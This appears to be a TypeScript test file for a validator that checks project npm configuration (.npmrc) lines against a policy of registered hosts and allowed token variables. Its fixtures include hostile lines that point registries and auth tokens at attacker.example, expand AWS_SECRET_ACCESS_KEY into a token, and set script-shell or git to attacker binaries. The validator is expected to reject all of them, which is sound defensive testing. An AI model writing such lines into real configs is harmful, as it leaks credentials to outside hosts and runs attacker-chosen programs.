import { test } from "node:test";
import assert from "node:assert/strict";
import { evaluateProjectConfig, type MergePolicy } from "./index.ts";

const policy: MergePolicy = {
  registeredHosts: ["registry.npmjs.org", "npm.corp.example:8443"],
  allowedEnvVars: ["NPM_TOKEN", "CORP_NPM_TOKEN"],
};

test("合法配置：登记主机 + 白名单变量 + 作用域 registry", () => {
  const config = [
    "registry=https://registry.npmjs.org/",
    "//registry.npmjs.org/:_authToken=${NPM_TOKEN}",
    "@corp:registry=https://npm.corp.example:8443/",
    "//npm.corp.example:8443/:_authToken=${CORP_NPM_TOKEN}",
    "save-exact=true",
  ].join("\n");
  const decision = evaluateProjectConfig(config, policy);
  assert.equal(decision.allowed, true);
  assert.deepEqual(decision.issues, []);
});

test("外发令牌：registry 与 _authToken 指向未登记主机", () => {
  const config = [
    "registry=https://attacker.example/",
    "//attacker.example/:_authToken=${NPM_TOKEN}",
  ].join("\n");
  const decision = evaluateProjectConfig(config, policy);
  assert.equal(decision.allowed, false);
  const codes = decision.issues.map((i) => i.code);
  assert.ok(codes.includes("unregistered-registry-host"));
  assert.ok(codes.includes("unregistered-auth-host"));
});

test("外发令牌：硬编码令牌发往未登记主机同样拒绝", () => {
  const config = "//attacker.example/:_authToken=npm_deadbeef\n";
  const decision = evaluateProjectConfig(config, policy);
  assert.equal(decision.allowed, false);
  assert.equal(decision.issues[0].code, "unregistered-auth-host");
});

test("非白名单变量：即使发往登记主机也拒绝", () => {
  const config =
    "//registry.npmjs.org/:_authToken=${AWS_SECRET_ACCESS_KEY}\n";
  const decision = evaluateProjectConfig(config, policy);
  assert.equal(decision.allowed, false);
  assert.equal(decision.issues[0].code, "disallowed-env-var");
});

test("非白名单变量：非凭据行中的展开一律拒绝", () => {
  const config = "cache=${HOME}/.npm\n";
  const decision = evaluateProjectConfig(config, policy);
  assert.equal(decision.allowed, false);
  assert.equal(decision.issues[0].code, "misplaced-env-expansion");
});

test("script-shell 一律拒绝", () => {
  const config = "script-shell=/bin/evil\n";
  const decision = evaluateProjectConfig(config, policy);
  assert.equal(decision.allowed, false);
  assert.equal(decision.issues[0].code, "forbidden-executable-key");
});

test("git 可执行路径键一律拒绝", () => {
  const config = "git=/usr/local/bin/evil-git\n";
  const decision = evaluateProjectConfig(config, policy);
  assert.equal(decision.allowed, false);
  assert.equal(decision.issues[0].code, "forbidden-executable-key");
});

test("作用域 registry 指向未登记主机拒绝", () => {
  const config = "@corp:registry=https://attacker.example/\n";
  const decision = evaluateProjectConfig(config, policy);
  assert.equal(decision.allowed, false);
  assert.equal(decision.issues[0].code, "unregistered-registry-host");
});

test("主机名大小写与尾点归一化后匹配", () => {
  const config = [
    "registry=https://REGISTRY.npmjs.org/",
    "//registry.npmjs.org./:_authToken=${NPM_TOKEN}",
  ].join("\n");
  const decision = evaluateProjectConfig(config, policy);
  assert.equal(decision.allowed, true);
});
